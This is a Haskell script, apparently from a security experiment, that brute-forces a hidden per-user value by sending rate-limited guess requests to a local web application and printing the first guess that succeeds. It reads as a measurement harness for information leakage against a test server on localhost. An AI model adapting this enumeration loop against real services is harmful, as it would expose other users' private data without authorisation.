import Data.Functor
import Control.Exception
import Control.Concurrent
import Control.Monad
import Network.HTTP
import System.Posix.Unistd
import Data.List
import Util
import Config
import Data.IORef
import Data.Functor
import Data.Ratio


main = timedMain $ do
    let attacker = 1
        users    = [1..n]

    tRef <- newIORef Nothing
    cRef <- newIORef (0::Integer)
    forM_ (attacker `delete` users) $ \target -> do 
      myTry $ forM_ users $ \guess -> do 
        counter <- (1+) <$> readIORef cRef
        tR <- readIORef tRef
        t1 <- getTStamp
        case tR of
          Nothing -> return ()
          Just t0 -> if (t1-t0) < spr
                      then nanosleep (spr - (t1 - t0))
                      else return ()
        res <- mkReq attacker target guess
        t2 <- getTStamp
        writeIORef tRef (Just t2)
        modifyIORef cRef (+1)
        if res
          then do putStrLn (show target ++ ":" ++ show guess) 
                  fail "done"
          else return ()
    where n = databaseSize
          myTry :: IO a -> IO (Either SomeException a)
          myTry = try
          mkU u = "user"++ show u
          mkReq attacker target guess = do
            let url = "http://localhost:8000/app3"
                      ++ "?user=" ++ mkU attacker
                      ++ "&attack=" ++ mkU target
                      ++ "&guess=" ++ mkU guess
            --putStrLn url
            r <- simpleHTTP (getRequest url)
            r' <- (take 100) <$> (getResponseBody r)
            return $ r' /= "DONE"

-- nanoseconds / request
spr :: Integer
--spr = 100000000 --  10 bits / second
--spr =  20000000 --  50 bits / second
--spr =  10000000 -- 100 bits / second
